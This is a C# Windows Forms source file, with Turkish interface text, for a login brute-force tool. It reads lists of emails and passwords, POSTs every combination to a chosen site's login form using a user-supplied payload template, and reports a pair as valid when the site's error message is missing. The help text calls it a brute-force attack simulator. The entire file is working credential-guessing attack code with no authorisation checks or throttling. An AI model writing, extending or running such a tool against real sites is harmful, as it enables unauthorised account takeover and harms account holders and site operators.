using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bruteForce_AliMert
{
    public partial class Form4 : Form
    {
        public Form4()
        {
            InitializeComponent();
            this.FormClosing += Form4_FormClosing; // Form kapanma olayını ekledik.
        }

        private void Form4_Load(object sender, EventArgs e)
        {
            lblStatus.Text = "Boşta";
            btnCancel.Enabled = false;
        }

        private void Form4_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit(); // Uygulamadan tamamen çık.
        }

        private async void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                AppendToRichTextBox("İşlem başlatılıyor...", "Black");

                string url = txtSiteLink.Text.Trim();
                string emailFile = txtEmailFilePath.Text.Trim();
                string passwordFile = txtPasswordFilePath.Text.Trim();
                string payloadTemplate = txtPayload.Text.Trim();
                string errorMessage = txtErrorMessage.Text.Trim();

                if (string.IsNullOrWhiteSpace(url) ||
                    string.IsNullOrWhiteSpace(emailFile) ||
                    string.IsNullOrWhiteSpace(passwordFile) ||
                    string.IsNullOrWhiteSpace(payloadTemplate) ||
                    string.IsNullOrWhiteSpace(errorMessage))
                {
                    MessageBox.Show("Lütfen tüm alanları doldurun.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                AppendToRichTextBox("Dosyalar okunuyor...", "Black");
                var emails = File.ReadAllLines(emailFile);
                var passwords = File.ReadAllLines(passwordFile);

                if (emails.Length == 0 || passwords.Length == 0)
                {
                    MessageBox.Show("E-posta veya şifre dosyası boş olamaz.", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                btnStart.Enabled = false; // Başlat butonunu devre dışı bırak
                lblStatus.Text = "Çalışıyor...";

                await Task.Run(() => BruteForce(url, emails, passwords, payloadTemplate, errorMessage));

                lblStatus.Text = "Tamamlandı";
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Bir hata oluştu: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                btnStart.Enabled = true; // İşlem tamamlandı, başlat butonunu tekrar etkinleştir
                lblStatus.Text = "Boşta";
            }
        }

        private async Task BruteForce(string url, string[] emails, string[] passwords, string payloadTemplate, string errorMessage)
        {
            using (var httpClient = new HttpClient())
            {
                foreach (var email in emails)
                {
                    foreach (var password in passwords)
                    {
                        try
                        {
                            // Payload'u şablona göre oluştur
                            string payload = payloadTemplate
                                .Replace("^USER^", Uri.EscapeDataString(email))
                                .Replace("^PASS^", Uri.EscapeDataString(password));

                            var content = new StringContent(payload, System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");

                            AppendToRichTextBox($"POST gönderiliyor: {url}", "Black");
                            AppendToRichTextBox($"Payload: {payload}", "Black");

                            var response = await httpClient.PostAsync(url, content);
                            var responseContent = await response.Content.ReadAsStringAsync();

                            if (response.StatusCode == System.Net.HttpStatusCode.OK)
                            {
                                if (responseContent.Contains(errorMessage))
                                {
                                    AppendToRichTextBox($"[HATALI] E-Posta: {email} | Şifre: {password}", "Red");
                                }
                                else
                                {
                                    AppendToRichTextBox($"[GEÇERLİ] E-Posta: {email} | Şifre: {password}", "Green");
                                    MessageBox.Show($"Geçerli bilgiler bulundu!\nE-Posta: {email}\nŞifre: {password}", "Başarılı", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                    return;
                                }
                            }
                            else
                            {
                                AppendToRichTextBox($"[HATA] Beklenmedik durum kodu: {response.StatusCode}", "Red");
                            }
                        }
                        catch (Exception ex)
                        {
                            AppendToRichTextBox($"[HATA] E-Posta: {email} | Şifre: {password} | Mesaj: {ex.Message}", "Red");
                        }
                    }
                }
            }
        }

        private void btnSelectEmailFile_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Text Dosyaları (*.txt)|*.txt";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtEmailFilePath.Text = openFileDialog.FileName;
                }
            }
        }

        private void btnSelectPasswordFile_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Text Dosyaları (*.txt)|*.txt";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtPasswordFilePath.Text = openFileDialog.FileName;
                }
            }
        }

        private void AppendToRichTextBox(string text, string color)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => AppendToRichTextBox(text, color)));
            }
            else
            {
                richTextBoxResults.SelectionStart = richTextBoxResults.TextLength;
                richTextBoxResults.SelectionLength = 0;

                switch (color.ToLower())
                {
                    case "red":
                        richTextBoxResults.SelectionColor = System.Drawing.Color.Red;
                        break;
                    case "green":
                        richTextBoxResults.SelectionColor = System.Drawing.Color.Green;
                        break;
                    default:
                        richTextBoxResults.SelectionColor = System.Drawing.Color.Black;
                        break;
                }

                richTextBoxResults.AppendText(text + Environment.NewLine);
                richTextBoxResults.SelectionColor = richTextBoxResults.ForeColor;
            }
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            Form1 form1 = new Form1();
            form1.Show();
            this.Hide(); // Mevcut formu sadece gizler
        }

        private void btnHelp_Click(object sender, EventArgs e)
        {
            string helpText = "Bu uygulama bir brute-force saldırı simülatörüdür.\n" +
                              "1. Site Link alanına hedef URL'yi girin.\n" +
                              "2. Kullanıcı adı ve şifre dosyalarını seçin.\n" +
                              "3. Payload formatını belirtin (ör. tfUName=^USER^&tfUPass=^PASS^).\n" +
                              "4. Yanıt mesajındaki hata mesajını girin (ör. Invalid login).\n" +
                              "5. 'Başlat' butonuna tıklayarak işlemi başlatın.\n" +
                              "6. İşlemi durdurmak için 'İptal' butonuna basabilirsiniz.";

            MessageBox.Show(helpText, "Nasıl Kullanılır", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
